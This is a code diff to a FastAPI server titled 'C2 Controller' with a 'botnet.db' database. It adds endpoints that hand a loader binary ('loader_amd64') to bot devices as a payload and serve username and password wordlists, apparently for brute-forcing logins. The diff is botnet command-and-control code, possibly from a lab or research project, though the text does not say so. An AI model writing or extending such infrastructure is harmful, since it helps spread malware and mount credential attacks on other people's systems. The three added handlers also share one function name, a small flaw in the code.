@@ -14,11 +14,15 @@ import datetime
 import os
 import uuid
 import json
+import io
+import inspect
 
 from fastapi import FastAPI, HTTPException
+from fastapi.responses import FileResponse
 from pydantic import BaseModel
 from typing import Any
 
+this_path = os.path.dirname(inspect.stack()[0][1])
 app = FastAPI(title="C2 Controller")
 DB = os.getenv("DB_PATH", "botnet.db")
 
@@ -197,6 +201,33 @@ def get_tasks(device_id: str):
     con.close()
 
     return [{"task_id": r["id"], "task": r["task"]} for r in rows]
+
+@app.get("/payload")
+def get_payload(device_id: int):
+    binary_path = os.path.join(this_path, "../bin/loader_amd64")
+    return FileResponse(
+            path=binary_path,
+            media_type="application/octet-stream",
+            filename="loader_amd64"
+            )
+
+@app.get("/wordlist/users")
+def get_payload(device_id: int):
+    binary_path = os.path.join(this_path, "../src/testuser.txt")
+    return FileResponse(
+            path=binary_path,
+            media_type="application/octet-stream",
+            filename="testuser.txt"
+            )
+
+@app.get("/wordlist/passwords")
+def get_payload(device_id: int):
+    binary_path = os.path.join(this_path, "../src/testpass.txt")
+    return FileResponse(
+            path=binary_path,
+            media_type="application/octet-stream",
+            filename="testpass.txt"
+            )
 
 @app.post("/result", status_code=204)
 def post_result(payload: ResultPayload):
